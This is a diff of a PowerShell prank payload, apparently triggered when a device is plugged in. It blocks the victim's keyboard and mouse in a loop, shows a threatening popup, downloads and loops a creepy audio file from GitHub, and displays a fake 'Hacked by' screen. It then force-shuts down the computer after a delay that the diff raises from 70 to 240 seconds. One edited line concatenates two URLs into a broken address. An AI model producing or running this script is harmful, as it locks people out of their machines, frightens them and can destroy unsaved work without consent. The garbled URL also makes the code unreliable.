@@ -2,8 +2,8 @@ Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 public class Win32 {
-    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
-    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+  [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
+  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 }
 "@
 
@@ -22,65 +22,29 @@ Start-Job {
 "@
     while ($true) {
         [InputBlocker]::BlockInput($true)
-        Start-Sleep -Milliseconds 100
+        Start-Sleep -Milliseconds 500
     }
 }
 
 # 🪦 Creepy popup
 Add-Type -AssemblyName PresentationFramework
-[System.Windows.MessageBox]::Show("You shouldn't have plugged that in... I'm watching.","System Alert")
+[System.Windows.MessageBox]::Show("You shouldn''t have plugged that in... I''m watching.","System Alert")
 
-# 🔊 RELIABLE AUDIO PLAYBACK
-try {
-    $soundUrl = "https://raw.githubusercontent.com/andythecookie13bruce/wizard-prank/main/sound.mp3"
-    $tempFile = "$env:TEMP\prank_sound.mp3"
-    
-    # Download the sound file
-    Invoke-WebRequest -Uri $soundUrl -OutFile $tempFile -ErrorAction Stop
-
-    # METHOD 1: Native mciSendString (most reliable for MP3)
-    try {
-        Add-Type -TypeDefinition @"
-        using System.Runtime.InteropServices;
-        public class AudioPlayer {
-            [DllImport("winmm.dll")]
-            public static extern int mciSendString(string command, System.Text.StringBuilder buffer, int bufferSize, System.IntPtr hwndCallback);
-            
-            public static void Play(string file) {
-                mciSendString($"open \"{file}\" type mpegvideo alias MediaFile", null, 0, System.IntPtr.Zero);
-                mciSendString("play MediaFile repeat", null, 0, System.IntPtr.Zero);
-            }
-        }
-"@
-        [AudioPlayer]::Play($tempFile)
-    } catch {
-        # METHOD 2: PowerShell SoundPlayer fallback (converts to WAV)
-        try {
-            $wavFile = "$env:TEMP\prank_sound.wav"
-            ffmpeg -i $tempFile -acodec pcm_u8 -ar 22050 $wavFile -y
-            Add-Type -AssemblyName System.Windows.Forms
-            $player = New-Object System.Media.SoundPlayer
-            $player.SoundLocation = $wavFile
-            $player.PlayLooping()
-        } catch {
-            # METHOD 3: PowerShell Beep Final Fallback
-            1..3 | ForEach-Object {
-                [console]::beep(500,300)
-                [console]::beep(300,500)
-                Start-Sleep -Milliseconds 200
-            }
-        }
-    }
-} catch {
-    # Ultimate fallback if everything fails
-    1..5 | ForEach-Object {
-        [console]::beep(800,200)
-        [console]::beep(400,400)
-        Start-Sleep -Milliseconds 100
+# 🔊 Play creepy audio from GitHub (whispers.wav)
+Add-Type -TypeDefinition @"
+using System.Media;
+public class Audio {
+    public static void Play(string url) {
+        System.Net.WebClient web = new System.Net.WebClient();
+        string temp = System.IO.Path.GetTempFileName() + ".wav";
+        web.DownloadFile(url, temp);
+        SoundPlayer player = new SoundPlayer(temp);
+        player.PlayLooping();
     }
 }
+"@
+[Audio]::Play("https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/whispers.wav")
 
-# [Rest of the original script remains unchanged...]
 # 💀 Glitchy crash screen with creepy style
 $html = @"
 <html>
@@ -90,7 +54,7 @@ $html = @"
     body {
       margin: 0;
       overflow: hidden;
-      background: url('https://raw.githubusercontent.com/andythecookie13bruce/wizard-prank/main/wizard.png') no-repeat center center fixed;
+      background: url('https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/https://raw.githubusercontent.com/andythecookie13bruce/wizard-prank/main/wizard.png') no-repeat center center fixed;
       background-size: cover;
       color: #ff0000;
       font-family: 'Creepster', 'UnifrakturCook', cursive;
@@ -128,7 +92,7 @@ $html = @"
     <h1>☠️</h1>
     <h2>Your soul is mine.</h2>
     <p>The machine is cursed.</p>
-    <p>You shouldn't have summoned me.</p>
+    <p>You shouldn’t have summoned me.</p>
     <p style="font-size: 20px;">Hacked by Dxpressed</p>
   </div>
   <script>
@@ -157,6 +121,6 @@ Start-Job {
   }
 }
 
-# ⏳ Wait 70 seconds, then shutdown
-Start-Sleep -Seconds 70
+# ⏳ Wait 4 minutes, then shutdown
+Start-Sleep -Seconds 240
 Stop-Computer -Force
